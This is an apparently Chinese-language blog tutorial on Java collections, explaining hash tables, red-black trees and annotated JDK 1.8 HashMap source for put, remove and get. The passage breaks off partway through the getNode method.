href=\"#一-Map和Collection\" class=\"headerlink\" title=\"一.Map和Collection\"></a>一.Map和Collection</h3><p>Java 集合类总共两大接口: Map 和 Collection<br></p>\n<p>其中: Map 中元素是成对出现的(key, value), Collection 中元素是单独出现的.  如:<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Map&lt;String,String&gt; //true ,成对</span><br><span class=\"line\"></span><br><span class=\"line\">List&lt;String&gt; //true, 单独</span><br><span class=\"line\">List&lt;Map&lt;String,String&gt;&gt;// true, 单独， 一个Map对象</span><br><span class=\"line\"></span><br><span class=\"line\">List&lt;String, String&gt; //false</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"二-主要实现类\"><a href=\"#二-主要实现类\" class=\"headerlink\" title=\"二.主要实现类\"></a>二.主要实现类</h3><ul>\n<li>HashMap</li>\n<li>ConcurrentHashMapp</li>\n<li>HashTable</li>\n<li>TreeMap</li>\n<li>LinkendHashMap</li>\n</ul>\n<h3 id=\"三-具体实现\"><a href=\"#三-具体实现\" class=\"headerlink\" title=\"三.具体实现\"></a>三.具体实现</h3><h4 id=\"1-HashMap\"><a href=\"#1-HashMap\" class=\"headerlink\" title=\"1.HashMap\"></a>1.HashMap</h4><p>在JDK1.8中 HashMap由位桶+链表+红黑树实现.<br></p>\n<h5 id=\"1-1-散列表\"><a href=\"#1-1-散列表\" class=\"headerlink\" title=\"1.1 散列表\"></a>1.1 散列表</h5><h6 id=\"1-1-1-概念\"><a href=\"#1-1-1-概念\" class=\"headerlink\" title=\"1.1.1 概念\"></a>1.1.1 概念</h6><p>原文：<a href=\"https://www.cnblogs.com/absfree/p/5508570.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/absfree/p/5508570.html</a><br></p>\n<p>符号表是一种用于存储键值对（key-value pair）的数据结构，我们平常经常使用的数组也可以看做是一个特殊的符号表，数组中的“键”即为数组索引，值为相应的数组元素。也就是说，当符号表中所有的键都是较小的整数时，我们可以使用数组来实现符号表，将数组的索引作为键，而索引处的数组元素即为键对应的值，但是这一表示仅限于所有的键都是比较小的整数时，否则可能会使用一个非常大的数组。<strong>散列表是对以上策略的一种“升级”，但是它可以支持任意的键而并没有对它们做过多的限定。</strong> <br><br>对于基于散列表实现的符号表，若我们要在其中查找一个键，需要进行以下步骤：<br></p>\n<ul>\n<li><p>首先我们使用散列函数将给定键转化为一个“数组的索引”，理想情况下，不同的key会被转为不同的索引，但在实际应用中我们会遇到不同的键转为相同的索引的情况，这种情况叫做碰撞。</p>\n</li>\n<li><p>得到了索引后，我们就可以像访问数组一样，通过这个索引访问到相应的键值对。</p>\n</li>\n</ul>\n<p>以上就是散列表的核心思想，散列表是 <strong>时空权衡</strong> 的经典例子。当我们的空间无限大时，我们可以直接使用一个很大的数组来保存键值对，并用key作为数组索引，因为空间不受限，所以我们的键的取值可以无穷大，因此查找任何键都只需进行一次普通的数组访问。反过来，若对查找操作没有任何时间限制，我们就可以直接使用链表来保存所有键值对，这样把空间的使用降到了最低，但查找时只能顺序查找。在实际的应用中，我们的时间和空间都是有限的，所以我们必须在两者之间做出权衡，散列表就在时间和空间的使用上找到了一个很好的平衡点。散列表的一个优势在于我们只需调整散列算法的相应参数而无需对其他部分的代码做任何修改就能够在时间和空间的权衡上做出策略调整。<br></p>\n<h6 id=\"1-1-2-散列函数\"><a href=\"#1-1-2-散列函数\" class=\"headerlink\" title=\"1.1.2 散列函数\"></a>1.1.2 散列函数</h6><p>在散列表内部，我们使用 <strong>桶（bucket）</strong>来保存键值对，我们前面所说的数组索引即为桶号，决定了给定的键存于散列表的哪个桶中。散列表所拥有的桶数被称为散列表的<strong> 容量（capacity）</strong><br></p>\n<p>现在假设我们的散列表中有M个桶，桶号为0到M-1。我们的散列函数的功能就是把任意给定的key转为[0, M-1]上的整数。我们对散列函数有两个基本要求：一是计算时间要短，二是尽可能把键分布在不同的桶中。对于不同类型的键，我们需要使用不同的散列函数，这样才能保证有比较好的散列效果。<br></p>\n<p>我们使用的散列函数应该尽可能满足均匀散列假设,使用的散列函数能够均匀并独立地将所有的键散布于0到M – 1之间。这样一来，满足均匀性与独立性能够保证键值对在散列表的分布尽可能的均匀，不会出现“许多键值对被散列到同一个桶，而同时许多桶为空”的情况。<br></p>\n<p>Java中的常用类，基本都重写了 <strong>hashCode()</strong> 方法，用于获取其散列值.<br></p>\n<h6 id=\"1-1-3-获取桶号\"><a href=\"#1-1-3-获取桶号\" class=\"headerlink\" title=\"1.1.3 获取桶号\"></a>1.1.3 获取桶号</h6><p>前面我们介绍了计算对象hashCode的一些方法，那么我们获取了hashCode之后，如何进一步得到桶号呢？一个直接的办法就是直接拿得到的hashCode除以capacity（桶的数量），然后用所得的余数作为桶号。不过在Java中，hashCode是int型的，而Java中的int型均为有符号，所以我们要是直接使用返回的hashCode的话可能会得到一个负数，显然桶号是不能为负的。所以我们先将返回的hashCode转变为一个非负整数，再用它除以capacity取余数，作为key的对应桶号，具体代码如下：<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private int hash(K key) &#123;</span><br><span class=\"line\">    return (key.hashCode() &amp; 0x7fffffff) % M;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"1-1-4-处理碰撞\"><a href=\"#1-1-4-处理碰撞\" class=\"headerlink\" title=\"1.1.4 处理碰撞\"></a>1.1.4 处理碰撞</h6><ul>\n<li>拉链法</li>\n</ul>\n<p>以这种方式实现的散列表，每个桶里都存放了一个链表。初始时所有链表均为空，当一个键被散列到一个桶时，这个键就成为相应桶中链表的首结点，之后若再有一个键被散列到这个桶（即发生碰撞），第二个键就会成为链表的第二个结点，以此类推。这样一来，当桶数为M，散列表中存储的键值对数目为N时，平均每个桶中的链表包含的结点数为N / M。因此，当我们查找一个键时，首先通过散列函数确定它所在的桶，这一步所需时间为O(1)；然后我们依次比较桶中结点的键与给定键，若相等则找到了指定键值对，这一步所需时间为O(N / M)。所以查找操作所需的时间为O(N / M)，而通常我们都能够保证N是M的常数倍，所以散列表的查找操作的时间复杂度为O(1)，同理我们也可以得到插入操作的复杂度也为O(1)。<br></p>\n<p>在上面的实现中，我们固定了散列表的桶数，当我们明确知道我们要插入的键值对数目最多只能到达桶数的常数倍时，固定桶数是完全可行的。但是若键值对数目会增长到远远大于桶数，我们就需要动态调整桶数的能力。实际上，散列表中的键值对数与桶数的比值叫做负载因子（load factor）。通常负载因子越小，我们进行查找所需时间就越短，而空间的使用就越大；若负载因子较大，则查找时间会变长，但是空间使用会减小。比如，Java标准库中的HashMap就是基于拉链法实现的散列表，它的默认负载因子为0.75。HashMap实现动态调整桶数的方式是基于公式loadFactor = maxSize / capacity，其中maxSize为支持存储的最大键值对数，而loadFactor和capacity（桶数）都会在初始化时由用户指定或是由系统赋予默认值。当HashMap中的键值对的数目达到了maxSize时，就会增大散列表中的桶数。<br></p>\n<ul>\n<li>线性探测法</li>\n</ul>\n<p>线性探测法是另一种散列表的实现策略的具体方法，这种策略叫做开放定址法。开放定址法的主要思想是：用大小为M的数组保存N个键值对，其中M &gt; N，数组中的空位用于解决碰撞问题。线性探测法的主要思想是：当发生碰撞时（一个键被散列到一个已经有键值对的数组位置），我们会检查数组的下一个位置，这个过程被称作线性探测。<br></p>\n<p>线性探测可能会产生三种结果:<br><br>命中：该位置的键与要查找的键相同；<br><br>未命中：该位置为空；<br><br>该位置的键和被查找的键不同。<br></p>\n<p>当我们查找某个键时，首先通过散列函数得到一个数组索引后，之后我们就开始检查相应位置的键是否与给定键相同，若不同则继续查找（若到数组末尾也没找到就折回数组开头），直到找到该键或遇到一个空位置。由线性探测的过程我们可以知道，若数组已满的时候我们再向其中插入新键，会陷入无限循环之中。<br></p>\n<p>有必要实现动态增长数组来保持查找操作的常数时间复杂度。当键值对总数很小时，若空间比较紧张，可以动态缩小数组，这取决于实际情况。<br></p>\n<h5 id=\"1-2-红黑树\"><a href=\"#1-2-红黑树\" class=\"headerlink\" title=\"1.2 红黑树\"></a>1.2 红黑树</h5><h6 id=\"1-2-1-二叉查找树\"><a href=\"#1-2-1-二叉查找树\" class=\"headerlink\" title=\"1.2.1 二叉查找树\"></a>1.2.1 二叉查找树</h6><p>二叉查找树（Binary Search Tree），也称有序二叉树（ordered binary tree）,排序二叉树（sorted binary tree），是指一棵空树或者具有下列性质的二叉树：<br></p>\n<ul>\n<li>若任意结点的左子树不空，则左子树上所有结点的值均小于它的根结点的值；</li>\n<li>若任意结点的右子树不空，则右子树上所有结点的值均大于它的根结点的值；</li>\n<li>任意结点的左、右子树也分别为二叉查找树。</li>\n<li>没有键值相等的结点（no duplicate nodes）。</li>\n</ul>\n<p>二叉查找树一般查找时间为O(lgn),当极端情况出现时，二叉树退化为一颗具有n个节点的线性链后，复杂度退化为线性O(n).</p>\n<h6 id=\"1-2-2-红黑树\"><a href=\"#1-2-2-红黑树\" class=\"headerlink\" title=\"1.2.2 红黑树\"></a>1.2.2 红黑树</h6><p>红黑树本质上是一颗二叉查找树,红黑树增加了一些性质，保证在最坏的情况下，复杂的也是O(logn).<br></p>\n<ul>\n<li>每个结点要么是红的，要么是黑的。  </li>\n<li>根结点是黑的。  </li>\n<li>每个叶结点（叶结点即指树尾端NIL指针或NULL结点）是黑的。  </li>\n<li>如果一个结点是红的，那么它的俩个儿子都是黑的。  </li>\n<li>对于任一结点而言，其到叶结点树尾端NIL指针的每一条路径都包含相同数目的黑结点。  </li>\n</ul>\n<p>图片来源(<a href=\"https://github.com/julycoding/The-Art-Of-Programming-By-July/blob/master/ebook/zh/03.01.md\" target=\"_blank\" rel=\"noopener\">https://github.com/julycoding/The-Art-Of-Programming-By-July/blob/master/ebook/zh/03.01.md</a>)<br><br><img src=\"http://67.216.218.49:8000/file/blogs/java/collection/hongheishu.png\" alt=\"shu\"></p>\n<h6 id=\"1-2-3-红黑树的操作\"><a href=\"#1-2-3-红黑树的操作\" class=\"headerlink\" title=\"1.2.3 红黑树的操作\"></a>1.2.3 红黑树的操作</h6><p>当我们在对红黑树进行插入和删除等操作时，对树做了修改，那么可能会违背红黑树的性质。为了继续保持红黑树的性质，我们可以通过对结点进行重新着色，以及对树进行相关的旋转操作，即修改树中某些结点的颜色及指针结构，来达到对红黑树进行插入或删除结点等操作后，继续保持它的性质或平衡。<br><br>不在这里详述，单独写一篇文章<br></p>\n<h5 id=\"1-3-HashMap\"><a href=\"#1-3-HashMap\" class=\"headerlink\" title=\"1.3 HashMap\"></a>1.3 HashMap</h5><h6 id=\"1-3-1-属性\"><a href=\"#1-3-1-属性\" class=\"headerlink\" title=\"1.3.1 属性\"></a>1.3.1 属性</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//初始容量  10000(2进制)</span><br><span class=\"line\">static final int DEFAULT_INITIAL_CAPACITY = 1 &lt;&lt; 4; // aka 16</span><br><span class=\"line\"></span><br><span class=\"line\">//最大容量</span><br><span class=\"line\">static final int MAXIMUM_CAPACITY = 1 &lt;&lt; 30;</span><br><span class=\"line\"></span><br><span class=\"line\">//默认负载因子</span><br><span class=\"line\">static final float DEFAULT_LOAD_FACTOR = 0.75f;</span><br><span class=\"line\"></span><br><span class=\"line\">//当节点中的元素个数大于该值时，桶中链表转换为树</span><br><span class=\"line\">static final int TREEIFY_THRESHOLD = 8;</span><br><span class=\"line\"></span><br><span class=\"line\">//同上，不过是将树转化为链表表</span><br><span class=\"line\">static final int UNTREEIFY_THRESHOLD = 6;</span><br><span class=\"line\"></span><br><span class=\"line\">//桶可能被转为树形结构时的最小容量</span><br><span class=\"line\">static final int MIN_TREEIFY_CAPACITY = 64;</span><br></pre></td></tr></table></figure>\n<h6 id=\"1-3-2-构造方法\"><a href=\"#1-3-2-构造方法\" class=\"headerlink\" title=\"1.3.2 构造方法\"></a>1.3.2 构造方法</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public HashMap(int initialCapacity, float loadFactor) &#123;</span><br><span class=\"line\">   if (initialCapacity &lt; 0)</span><br><span class=\"line\">       throw new IllegalArgumentException(&quot;Illegal initial capacity: &quot; +</span><br><span class=\"line\">                                          initialCapacity);</span><br><span class=\"line\">   if (initialCapacity &gt; MAXIMUM_CAPACITY)</span><br><span class=\"line\">       initialCapacity = MAXIMUM_CAPACITY;</span><br><span class=\"line\">   if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))</span><br><span class=\"line\">       throw new IllegalArgumentException(&quot;Illegal load factor: &quot; +</span><br><span class=\"line\">                                          loadFactor);</span><br><span class=\"line\">   this.loadFactor = loadFactor;</span><br><span class=\"line\">   this.threshold = tableSizeFor(initialCapacity);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">public HashMap(int initialCapacity) &#123;</span><br><span class=\"line\">   this(initialCapacity, DEFAULT_LOAD_FACTOR);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">public HashMap() &#123;</span><br><span class=\"line\">   this.loadFactor = DEFAULT_LOAD_FACTOR; // all other fields defaulted</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public HashMap(Map&lt;? extends K, ? extends V&gt; m) &#123;</span><br><span class=\"line\">   this.loadFactor = DEFAULT_LOAD_FACTOR;</span><br><span class=\"line\">   putMapEntries(m, false);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其中，初始化threshold时:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">static final int tableSizeFor(int cap) &#123;</span><br><span class=\"line\">    int n = cap - 1;</span><br><span class=\"line\">    n |= n &gt;&gt;&gt; 1;</span><br><span class=\"line\">    n |= n &gt;&gt;&gt; 2;</span><br><span class=\"line\">    n |= n &gt;&gt;&gt; 4;</span><br><span class=\"line\">    n |= n &gt;&gt;&gt; 8;</span><br><span class=\"line\">    n |= n &gt;&gt;&gt; 16;</span><br><span class=\"line\">    return (n &lt; 0) ? 1 : (n &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>此算法原理为: <br><br>原文:<a href=\"https://www.cnblogs.com/loading4/p/6239441.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/loading4/p/6239441.html</a><br><br>通过位运算，找到大于入参的最近一个2的整数次幂<br></p>\n<ul>\n<li><p>先来假设n的二进制为01xxx…xxx。接着</p>\n</li>\n<li><p>对n右移1位：001xx…xxx，再位或：011xx…xxx</p>\n</li>\n<li><p>对n右移2为：00011…xxx，再位或：01111…xxx</p>\n</li>\n<li><p>此时前面已经有四个1了，再右移4位且位或可得8个1</p>\n</li>\n<li><p>同理，有8个1，右移8位肯定会让后八位也为1。</p>\n</li>\n<li>综上可得，该算法让最高位的1后面的位全变为1。</li>\n<li>最后再让结果n+1，即得到了2的整数次幂的值了</li>\n</ul>\n<p><strong>threshold这个成员变量是阈值，决定了是否要将散列表再散列。它的值应该是：capacity * load_factor才对的。里仅仅是一个初始化，当创建哈希表的时候，它会重新赋值<br></strong></p>\n<h6 id=\"1-3-3-增-put\"><a href=\"#1-3-3-增-put\" class=\"headerlink\" title=\"1.3.3 增 put()\"></a>1.3.3 增 put()</h6><p>HashMap的内部链表结构:<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">static class Node&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; &#123;</span><br><span class=\"line\">    final int hash;</span><br><span class=\"line\">    final K key;</span><br><span class=\"line\">    V value;</span><br><span class=\"line\">    Node&lt;K,V&gt; next;</span><br><span class=\"line\"></span><br><span class=\"line\">    Node(int hash, K key, V value, Node&lt;K,V&gt; next) &#123;</span><br><span class=\"line\">        this.hash = hash;</span><br><span class=\"line\">        this.key = key;</span><br><span class=\"line\">        this.value = value;</span><br><span class=\"line\">        this.next = next;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  .....</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>添加元素的put()方法:<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public V put(K key, V value) &#123;</span><br><span class=\"line\">    return putVal(hash(key), key, value, false, true);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">final V putVal(int hash, K key, V value, boolean onlyIfAbsent,</span><br><span class=\"line\">                  boolean evict) &#123;</span><br><span class=\"line\">  //链表结构存储</span><br><span class=\"line\">   Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i;</span><br><span class=\"line\">   //散列表为null时  初始化</span><br><span class=\"line\">   if ((tab = table) == null || (n = tab.length) == 0)</span><br><span class=\"line\">       n = (tab = resize()).length;</span><br><span class=\"line\">  //没有发生碰撞，直接存储</span><br><span class=\"line\">   if ((p = tab[i = (n - 1) &amp; hash]) == null)</span><br><span class=\"line\">       tab[i] = newNode(hash, key, value, null);</span><br><span class=\"line\">  //发生碰撞</span><br><span class=\"line\">   else &#123;</span><br><span class=\"line\">       Node&lt;K,V&gt; e; K k;</span><br><span class=\"line\">      //hash和key都相等，记录下来，下一步处理</span><br><span class=\"line\">       if (p.hash == hash &amp;&amp;</span><br><span class=\"line\">           ((k = p.key) == key || (key != null &amp;&amp; key.equals(k))))</span><br><span class=\"line\">           e = p;</span><br><span class=\"line\">      //树形结构，调用树的方法</span><br><span class=\"line\">       else if (p instanceof TreeNode)</span><br><span class=\"line\">           e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value);</span><br><span class=\"line\">      //链表结构</span><br><span class=\"line\">       else &#123;</span><br><span class=\"line\">           for (int binCount = 0; ; ++binCount) &#123;</span><br><span class=\"line\">               //没有找到映射的节点，在链表尾部插入</span><br><span class=\"line\">               if ((e = p.next) == null) &#123;</span><br><span class=\"line\">                   p.next = newNode(hash, key, value, null);</span><br><span class=\"line\">                   //节点数大于等于TREEIFY_THRESHOLD 转为树形存储</span><br><span class=\"line\">                   if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st</span><br><span class=\"line\">                       treeifyBin(tab, hash);</span><br><span class=\"line\">                   break;</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">               //找到hash值映射的节点，插入</span><br><span class=\"line\">               if (e.hash == hash &amp;&amp;</span><br><span class=\"line\">                   ((k = e.key) == key || (key != null &amp;&amp; key.equals(k))))</span><br><span class=\"line\">                   break;</span><br><span class=\"line\">               p = e;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       //上一步的e,因为hash和key都存在，用新值覆盖旧值，返回旧值</span><br><span class=\"line\">       if (e != null) &#123; // existing mapping for key</span><br><span class=\"line\">           V oldValue = e.value;</span><br><span class=\"line\">           if (!onlyIfAbsent || oldValue == null)</span><br><span class=\"line\">               e.value = value;</span><br><span class=\"line\">           afterNodeAccess(e);</span><br><span class=\"line\">           return oldValue;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   ++modCount;</span><br><span class=\"line\">   //检查阈值，是否再次散列</span><br><span class=\"line\">   if (++size &gt; threshold)</span><br><span class=\"line\">       resize();</span><br><span class=\"line\">   afterNodeInsertion(evict);</span><br><span class=\"line\">   return null;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"1-3-4-删-remove\"><a href=\"#1-3-4-删-remove\" class=\"headerlink\" title=\"1.3.4 删 remove()\"></a>1.3.4 删 remove()</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public V remove(Object key) &#123;</span><br><span class=\"line\">    Node&lt;K,V&gt; e;</span><br><span class=\"line\">    return (e = removeNode(hash(key), key, null, false, true)) == null ?</span><br><span class=\"line\">        null : e.value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">final Node&lt;K,V&gt; removeNode(int hash, Object key, Object value,</span><br><span class=\"line\">                           boolean matchValue, boolean movable) &#123;</span><br><span class=\"line\">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, index;</span><br><span class=\"line\">    //hash值指向的桶是否存在</span><br><span class=\"line\">    if ((tab = table) != null &amp;&amp; (n = tab.length) &gt; 0 &amp;&amp;</span><br><span class=\"line\">        (p = tab[index = (n - 1) &amp; hash]) != null) &#123;</span><br><span class=\"line\">        Node&lt;K,V&gt; node = null, e; K k; V v;</span><br><span class=\"line\">        //在首位进行查找，记录下找到的节点</span><br><span class=\"line\">        if (p.hash == hash &amp;&amp;</span><br><span class=\"line\">            ((k = p.key) == key || (key != null &amp;&amp; key.equals(k))))</span><br><span class=\"line\">            node = p;</span><br><span class=\"line\">        //没找到，继续找</span><br><span class=\"line\">        else if ((e = p.next) != null) &#123;</span><br><span class=\"line\">           //树里面找</span><br><span class=\"line\">            if (p instanceof TreeNode)</span><br><span class=\"line\">                node = ((TreeNode&lt;K,V&gt;)p).getTreeNode(hash, key);</span><br><span class=\"line\">            else &#123;</span><br><span class=\"line\">              //链表里面找</span><br><span class=\"line\">                do &#123;</span><br><span class=\"line\">                    if (e.hash == hash &amp;&amp;</span><br><span class=\"line\">                        ((k = e.key) == key ||</span><br><span class=\"line\">                         (key != null &amp;&amp; key.equals(k)))) &#123;</span><br><span class=\"line\">                        node = e;</span><br><span class=\"line\">                        break;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    p = e;</span><br><span class=\"line\">                &#125; while ((e = e.next) != null);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //将找到的node删除</span><br><span class=\"line\">        if (node != null &amp;&amp; (!matchValue || (v = node.value) == value ||</span><br><span class=\"line\">                             (value != null &amp;&amp; value.equals(v)))) &#123;</span><br><span class=\"line\">            if (node instanceof TreeNode)</span><br><span class=\"line\">                ((TreeNode&lt;K,V&gt;)node).removeTreeNode(this, tab, movable);</span><br><span class=\"line\">            else if (node == p)</span><br><span class=\"line\">                tab[index] = node.next;</span><br><span class=\"line\">            else</span><br><span class=\"line\">                p.next = node.next;</span><br><span class=\"line\">            ++modCount;</span><br><span class=\"line\">            --size;</span><br><span class=\"line\">            afterNodeRemoval(node);</span><br><span class=\"line\">            return node;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return null;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"1-3-5-查-get\"><a href=\"#1-3-5-查-get\" class=\"headerlink\" title=\"1.3.5 查 get()\"></a>1.3.5 查 get()</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public V get(Object key) &#123;</span><br><span class=\"line\">   Node&lt;K,V&gt; e;</span><br><span class=\"line\">   return (e = getNode(hash(key), key)) == null ? null : e.value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">final Node&lt;K,V&gt; getNode(int hash, Object key) &#123;</span><br><span class=\"line\">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; first, e; int n; K k;</span><br><span class=\"line\">    if ((tab = table) != null &amp;&amp; (n = tab.length) &gt; 0 &amp;&amp;</span><br><span class=\"line\">        (first = tab[(n - 1) &amp; hash]) != null) &#123;</span><br><span class=\"line\">        if (first.hash == hash &amp;&amp; // always check first node</span><br><span class=\"line\">            ((k = 